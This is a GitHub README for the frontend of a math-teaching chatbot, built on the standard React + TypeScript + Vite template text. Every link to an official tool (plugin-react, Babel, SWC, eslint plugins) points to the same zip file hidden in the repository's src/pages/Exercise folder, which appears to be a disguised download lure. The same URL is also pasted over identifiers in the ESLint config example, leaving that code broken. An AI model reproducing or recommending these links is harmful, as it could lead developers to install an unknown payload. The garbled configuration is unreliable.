# MathChatBot-Front

## Project Overview

This is the frontend for Math Teaching Chatbot System. The full project is split across multiple repositories:

- Frontend: [MathChatBot-Front](https://github.com/Rezzpect/MathChatBot-Front) (you are here)
- Backend: [MathChatBot-Back](https://github.com/ReallyWarm/MathChatBot-Back)
- n8n-Workflow: [Math-Teaching-Chatbot-System-Workflow-n8n](https://github.com/Kfirm1208/Math-Teaching-Chatbot-System-Workflow-n8n)

## React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip) uses [Babel](https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip) uses [SWC](https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip) for Fast Refresh

### Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip and replace with this
      https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip,
      // Alternatively, use this for stricter rules
      https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip,
      // Optionally, add this for stylistic rules
      https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip', 'https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip'],
        tsconfigRootDir: https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip) and [eslint-plugin-react-dom](https://raw.githubusercontent.com/Kfirm1208/MathChatBot-Front/main/src/pages/Exercise/Front-Chat-Math-Bot-3.9.zip) for React-specific lint rules:
